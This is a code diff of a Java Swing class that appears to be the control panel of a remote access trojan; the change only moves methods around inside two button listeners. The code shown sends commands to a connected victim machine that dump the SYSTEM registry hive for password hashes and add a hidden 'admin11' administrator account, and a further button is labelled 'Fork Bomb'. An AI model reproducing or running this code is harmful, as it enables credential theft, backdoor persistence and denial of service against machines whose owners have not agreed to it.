@@ -122,11 +122,6 @@ public class MotherJInternalFrame extends MJInternalFrame {
 		gbc_btnNewButton_4.gridy = 1;
 		getContentPane().add(btnNewButton_4, gbc_btnNewButton_4);	
 		btnNewButton_4.addMouseListener(new MouseAdapter() {
-			@Override
-			public void mouseClicked(MouseEvent arg0) {
-				dumptheHash();
-			}
-
 			private void dumptheHash() {
 				// TODO Auto-generated method stub
 				if(_vOs)
@@ -136,6 +131,11 @@ public class MotherJInternalFrame extends MJInternalFrame {
 				connexion.sendCmdCommand("reg save HKLM\\SYSTEM %"+connexion.get_user_name()+"%.system");
 				connexion.sendCmdCommand("save "+connexion.get_user_name()+"%.system");
 				}
+			}
+
+			@Override
+			public void mouseClicked(MouseEvent arg0) {
+				dumptheHash();
 			}
 		});
 
@@ -185,16 +185,16 @@ public class MotherJInternalFrame extends MJInternalFrame {
 		gbc_btnNewButton_5.gridy = 3;
 		getContentPane().add(btnNewButton_5, gbc_btnNewButton_5);
 		btnNewButton_5.addMouseListener(new MouseAdapter() {
-			@Override
-			public void mouseClicked(MouseEvent arg0) {
-				ajouterUtilisateur();
-			}
 			private void ajouterUtilisateur() {
 				if (!_vOs) {
 
 				} else {
 					_connexion.sendCmdCommand("net user admin11  /add /passwordchg:no");
 				}
+			}
+			@Override
+			public void mouseClicked(MouseEvent arg0) {
+				ajouterUtilisateur();
 			}
 		});
 		JButton btnNewButton_2 = new JButton("Fork Bomb");
